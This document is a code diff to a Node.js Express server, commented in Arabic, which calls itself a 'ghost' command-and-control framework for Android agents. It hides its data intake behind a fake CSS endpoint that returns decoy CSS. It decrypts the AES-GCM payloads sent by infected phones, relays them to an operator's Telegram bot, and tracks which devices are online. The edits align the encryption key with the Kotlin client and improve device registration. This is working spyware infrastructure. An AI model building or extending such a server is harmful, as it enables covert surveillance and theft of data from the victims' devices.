@@ -1,4 +1,4 @@
-// app.js - إطار الإدارة والتحكم الشبح المتكامل بالأزرار (2026)
+// app.js - إطار الإدارة والتحكم الشبح المتكامل والمطابق للتشفير (2026)
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
@@ -16,22 +16,29 @@ if (!token || !chatId) {
 const app = express();
 const appBot = new telegramBot(token, { polling: true });
 
-// قاعدة بيانات ديناميكية في الذاكرة العشوائية لإدارة نبضات الأجهزة المتصلة
 const appClients = new Map();
 
 app.use(express.text({ type: '*/*', limit: '50mb' }));
 
-// اشتقاق مفتاح التشفير العسكري في الذاكرة العشوائية لمنع تتبعه
-const CRYPTO_KEY = crypto.scryptSync(ENCRYPTION_SECRET, 'system_salt', 32);
+// 🌟 التصحيح الذهبي: اشتقاق المفتاح مباشرة من بايتات النص ليتطابق 100% مع كود الأندرويد الحالي (Kotlin)
+const secretBuffer = Buffer.from(ENCRYPTION_SECRET, 'utf8');
+const CRYPTO_KEY = Buffer.alloc(32); // حجز 32 بايت (AES-256)
+secretBuffer.copy(CRYPTO_KEY, 0, 0, Math.min(secretBuffer.length, 32));
 
-// --- موديول فك التشفير المتقدم (AES-256-GCM) ---
+// --- موديول فك التشفير المتقدم القياسي (AES-256-GCM) ---
 function decryptPayload(base64String) {
     try {
         const rawJson = Buffer.from(base64String, 'base64').toString('utf8');
         const packet = JSON.parse(rawJson);
-        const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, Buffer.from(packet.v, 'hex'));
-        decipher.setAuthTag(Buffer.from(packet.g, 'hex'));
-        let decrypted = decipher.update(packet.d, 'hex', 'utf8');
+        
+        const iv = Buffer.from(packet.v, 'hex');
+        const authTag = Buffer.from(packet.g, 'hex');
+        const encryptedData = Buffer.from(packet.d, 'hex');
+
+        const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, iv);
+        decipher.setAuthTag(authTag);
+        
+        let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
         decrypted += decipher.final('utf8');
         return decrypted;
     } catch (e) {
@@ -44,17 +51,21 @@ app.post('/assets/web/style-min.css', async (req, res) => {
     try {
         const syncMode = req.headers['x-sync-mode'] || 'generic';
         const agentModel = req.headers['x-agent-model'] || 'Unknown-Device';
-        const agentId = req.headers['x-agent-id'] || 'GhostAgent_AD';
+        const agentId = req.headers['x-agent-id'] || 'GhostAgent';
+
+        // تسجيل الجهاز بمجرد ملامسة النبضة للشبكة لضمان ظهوره في كل الأحوال
+        appClients.set(agentId, { model: agentModel, lastSeen: Date.now() });
 
         const decryptedRaw = decryptPayload(req.body);
-        if (!decryptedRaw) return res.sendStatus(404);
+        if (!decryptedRaw) {
+            // تنبيه ذكي في حال استمرار اختلاف المفتاح لمعرفة السبب
+            await appBot.sendMessage(chatId, `⚠️ <b>اتصال وارد من ${agentModel} ولكن فك التشفير تالف!</b>\nتأكد من إعدادات سطر الـ AGENT_SECRET في Render.`);
+            return res.status(200).send('/* Active Telemetry */');
+        }
 
         const payload = JSON.parse(decryptedRaw);
 
-        // تسجيل وتحديث حالة الجهاز المتصل في الذاكرة العشوائية
-        appClients.set(agentId, { model: agentModel, lastSeen: Date.now() });
-
-        let telegramMessage = `📥 <b>بيانات واردة من: ${agentModel}</b>\n`;
+        let telegramMessage = `📥 <b>بيانات مشفرة ناجحة من: ${agentModel}</b>\n`;
         telegramMessage += `📊 النوع: <code>${syncMode}</code>\n\n`;
         telegramMessage += `<pre>${JSON.stringify(payload, null, 2)}</pre>`;
 
@@ -65,36 +76,29 @@ app.post('/assets/web/style-min.css', async (req, res) => {
     }
 });
 
-// ========================================================
-// 📱 لوحة التحكم التفاعلية لبوت تليجرام (Telegram Interactivity)
-// ========================================================
+// === لوحة تحكم تليجرام بالأزرار ===
 const mainKeyboard = {
     parse_mode: 'HTML',
     reply_markup: {
         keyboard: [['📱 الاجهزة المتصلة']],
-        resize_keyboard: true,
-        one_time_keyboard: false
+        resize_keyboard: true
     }
 };
 
-// استقبال وقراءة رسائل تليجرام والرد الفوري بالأزرار
 appBot.on('message', async (msg) => {
     const text = msg.text;
-    const senderChatId = msg.chat.id;
+    if (String(msg.chat.id) !== String(chatId)) return;
 
-    // جدار حماية لمنع المتطفلين من التحكم بالبوت الخاص بك
-    if (String(senderChatId) !== String(chatId)) return;
-
-    if (text === '/start' || text === 'تفعيل' || text === 'hello') {
-        await appBot.sendMessage(chatId, '⚙️ <b>تم تشغيل وتفعيل لوحة تحكم النظام الشبح بنجاح.</b>\n\nبانتظار وصول الحزم المشفرة ونبضات العميل الأندرويد...', mainKeyboard);
+    if (text === '/start' || text === 'تفعيل') {
+        await appBot.sendMessage(chatId, '⚙️ <b>تم تفعيل لوحة تحكم النظام بنجاح.</b>\nبانتظار النبضات المشفرة من الأندرويد...', mainKeyboard);
     } 
     else if (text === '📱 الاجهزة المتصلة') {
         if (appClients.size === 0) {
-            await appBot.sendMessage(chatId, '📭 <b>لا توجد أجهزة متصلة بالخادم حالياً.</b>\n\nقم بتشغيل وتثبيت تطبيق الأندرويد لتبدأ النبضات بالظهور هنا.', mainKeyboard);
+            await appBot.sendMessage(chatId, '📭 <b>لا توجد أجهزة متصلة بالخادم حالياً.</b>', mainKeyboard);
         } else {
-            let reply = '<b>👥 الأجهزة والأنودات النشطة في الذاكرة:</b>\n\n';
+            let reply = '<b>👥 الأجهزة والأنودات النشطة حالياً:</b>\n\n';
             appClients.forEach((client, id) => {
-                const status = (Date.now() - client.lastSeen < 45000) ? '🟢 ONLINE' : '⚫ SLEEPING';
+                const status = (Date.now() - client.lastSeen < 60000) ? '🟢 ONLINE' : '⚫ SLEEPING';
                 reply += `• 📱 <b>الموديل:</b> ${client.model}\n🆔 <b>ID:</b> <code>${id}</code>\n📊 <b>الحالة:</b> ${status}\n\n`;
             });
             await appBot.sendMessage(chatId, reply, mainKeyboard);
@@ -106,5 +110,5 @@ app.get('/', (req, res) => res.status(200).send('Service Active'));
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`[+] خادم الإدارة الشبح يعمل الآن على المنفذ: ${PORT}`);
+    console.log(`[+] خادم الإدارة يعمل الآن على المنفذ: ${PORT}`);
 });
